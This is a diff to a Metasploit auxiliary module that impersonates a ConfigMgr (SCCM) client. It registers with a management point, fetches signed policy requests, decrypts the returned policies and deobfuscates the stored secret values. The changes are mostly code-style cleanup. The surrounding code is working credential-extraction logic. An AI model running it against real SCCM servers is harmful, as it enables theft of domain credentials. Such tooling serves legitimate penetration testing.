@@ -113,11 +113,12 @@ class MetasploitModule < Msf::Auxiliary
         'rport' => 80,
         'username' => datastore['COMPUTER_USER'],
         'password' => datastore['COMPUTER_PASS'],
-        'headers' => {'User-Agent' => 'ConfigMgr Messaging HTTP Sender',
-                      'Accept-Encoding' => 'gzip, deflate',
-                      'Accept' => '*/*',
-                      'Connection' => 'Keep-Alive'
-                     }
+        'headers' => {
+          'User-Agent' => 'ConfigMgr Messaging HTTP Sender',
+          'Accept-Encoding' => 'gzip, deflate',
+          'Accept' => '*/*',
+          'Connection' => 'Keep-Alive'
+        }
       }
 
       sms_id = register_request(http_opts, mp, key, cert)
@@ -141,16 +142,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def request_policy(http_opts, policy_url, sms_id, key)
-    policy_url.gsub!('http://<mp>','')
-    policy_url = policy_url.gsub('{','%7B').gsub('}','%7D')
+    policy_url.gsub!('http://<mp>', '')
+    policy_url = policy_url.gsub('{', '%7B').gsub('}', '%7D')
 
     now = Time.now.utc.iso8601
     client_token = "GUID:#{sms_id};#{now};2"
-    client_signature = rsa_sign(key, (client_token+"\x00").encode('utf-16le').bytes.pack('C*'))
+    client_signature = rsa_sign(key, (client_token + "\x00").encode('utf-16le').bytes.pack('C*'))
 
     opts = http_opts.merge({
-        'uri' => policy_url,
-        'method' => 'GET',
+      'uri' => policy_url,
+      'method' => 'GET'
     })
     opts['headers'] = opts['headers'].merge({
       'ClientToken' => client_token,
@@ -164,7 +165,7 @@ class MetasploitModule < Msf::Auxiliary
     cms_envelope = ci.enveloped_data
 
     ri = cms_envelope[:recipient_infos]
-    if ri.length < 1
+    if ri.empty?
       fail_with(Failure::UnexpectedReply, 'No recipient infos provided')
     end
 
@@ -192,12 +193,14 @@ class MetasploitModule < Msf::Auxiliary
       if iv.value.length != 16
         fail_with(Failure::UnexpectedReply, "Bad IV length: #{iv.length}")
       end
-      cipher = OpenSSL::Cipher::AES.new(256, :CBC)
+      cipher = OpenSSL::Cipher.new('aes-256-cbc')
       cipher.decrypt
       cipher.key = decrypted_key
       cipher.iv = iv.value
 
       decrypted = cipher.update(body) + cipher.final
+    else
+      fail_with(Failure::UnexpectedReply, "Unsupported decryption routine: #{cea[:algorithm].value}")
     end
 
     decrypted.force_encoding('utf-16le').encode('utf-8').delete_suffix("\x00")
@@ -226,15 +229,15 @@ class MetasploitModule < Msf::Auxiliary
     message = Rex::MIME::Message.new
     message.bound = 'aAbBcCdDv1234567890VxXyYzZ'
 
-    message.add_part(("\ufeff#{header}").encode('utf-16le').bytes.pack('C*'), 'text/plain; charset=UTF-16', nil)
+    message.add_part("\ufeff#{header}".encode('utf-16le').bytes.pack('C*'), 'text/plain; charset=UTF-16', nil)
     message.add_part(compressed, 'application/octet-stream', 'binary')
     opts = http_opts.merge({
-        'uri' => '/ccm_system/request',
-        'method' => 'CCM_POST',
-        'data' => message.to_s
+      'uri' => '/ccm_system/request',
+      'method' => 'CCM_POST',
+      'data' => message.to_s
     })
     opts['headers'] = opts['headers'].merge({
-      'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"',
+      'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'
     })
     http_response = send_request_cgi(opts)
     response = Rex::MIME::Message.new(http_response.to_s)
@@ -252,7 +255,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def rsa_sign(key, data)
-    signature = key.sign(OpenSSL::Digest::SHA256.new, data)
+    signature = key.sign(OpenSSL::Digest.new('SHA256'), data)
     signature.reverse!
 
     signature.unpack('H*')[0].upcase
@@ -289,24 +292,24 @@ class MetasploitModule < Msf::Auxiliary
     message = Rex::MIME::Message.new
     message.bound = 'aAbBcCdDv1234567890VxXyYzZ'
 
-    message.add_part(("\ufeff#{header}").encode('utf-16le').bytes.pack('C*'), 'text/plain; charset=UTF-16', nil)
+    message.add_part("\ufeff#{header}".encode('utf-16le').bytes.pack('C*'), 'text/plain; charset=UTF-16', nil)
     message.add_part(Rex::Text.zlib_deflate(rr_utf16), 'application/octet-stream', 'binary')
 
     opts = http_opts.merge({
-        'uri' => '/ccm_system_windowsauth/request',
-        'method' => 'CCM_POST',
-        'data' => message.to_s
+      'uri' => '/ccm_system_windowsauth/request',
+      'method' => 'CCM_POST',
+      'data' => message.to_s
     })
     opts['headers'] = opts['headers'].merge({
-      'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"',
+      'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'
     })
     response = send_request_cgi(opts)
     response = Rex::MIME::Message.new(response.to_s)
 
-    header_response = response.parts[0].content.force_encoding('utf-16le').encode('utf-8').delete_prefix("\uFEFF")
+    response.parts[0].content.force_encoding('utf-16le').encode('utf-8').delete_prefix("\uFEFF")
     compressed_response = Rex::Text.zlib_inflate(response.parts[1].content).force_encoding('utf-16le')
     xml_doc = Nokogiri::XML(compressed_response.encode('utf-8')) # It's crazy, but XML parsing doesn't work with UTF-16-encoded strings
-    sms_id = xml_doc.root&.attributes['SMSID']&.value&.delete_prefix('GUID:')
+    sms_id = xml_doc.root&.attributes&.[]('SMSID')&.value&.delete_prefix('GUID:')
     if sms_id.nil?
       fail_with(Failure::UnexpectedReply, 'Did not retrieve SMS ID')
     end
@@ -328,11 +331,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def deobfuscate_policy_value(value)
-    value = [value.gsub(/[^0-9A-Fa-f]/,'')].pack('H*')
+    value = [value.gsub(/[^0-9A-Fa-f]/, '')].pack('H*')
     data_length = value[52..55].unpack('I')[0]
-    buffer = value[64..64+data_length-1]
+    buffer = value[64..64 + data_length - 1]
     key = mscrypt_derive_key_sha1(value[4..43])
-    iv = "\x00"*8
+    iv = "\x00" * 8
     cipher = OpenSSL::Cipher.new('des-ede3-cbc')
     cipher.decrypt
     cipher.iv = iv
@@ -346,7 +349,7 @@ class MetasploitModule < Msf::Auxiliary
     buf1 = [0x36] * 64
     buf2 = [0x5C] * 64
 
-    digest = OpenSSL::Digest::SHA1.new
+    digest = OpenSSL::Digest.new('SHA1')
     hash = digest.digest(secret).bytes
 
     hash.each_with_index do |byte, i|
@@ -357,10 +360,10 @@ class MetasploitModule < Msf::Auxiliary
     buf1 = buf1.pack('C*')
     buf2 = buf2.pack('C*')
 
-    digest = OpenSSL::Digest::SHA1.new
+    digest = OpenSSL::Digest.new('SHA1')
     hash1 = digest.digest(buf1)
 
-    digest = OpenSSL::Digest::SHA1.new
+    digest = OpenSSL::Digest.new('SHA1')
     hash2 = digest.digest(buf2)
 
     hash1 + hash2[0..3]
